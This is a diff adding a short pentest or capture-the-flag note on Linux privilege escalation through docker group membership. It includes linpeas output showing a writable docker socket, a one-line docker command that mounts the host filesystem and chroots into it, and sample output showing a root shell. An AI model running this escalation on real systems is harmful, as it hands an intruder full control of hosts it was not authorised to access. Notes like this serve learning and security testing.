@@ -1,0 +1,20 @@
+You've landed on a box and that current user is in the docker group.
+
+So you run some linpeas and find stuff like ...
+
+[+] My user                                                                                                                                                  
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                        
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)   
+
+[+] Searching docker files                                                                                                                                   
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                                                       
+srw-rw---- 1 root docker 0 Nov 29 01:21 /run/docker.sock                                                                                                     
+Docker socket file (/run/docker.sock) is writable    
+
+
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+
+Example:
+r00t@ultratech-prod:/tmp$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
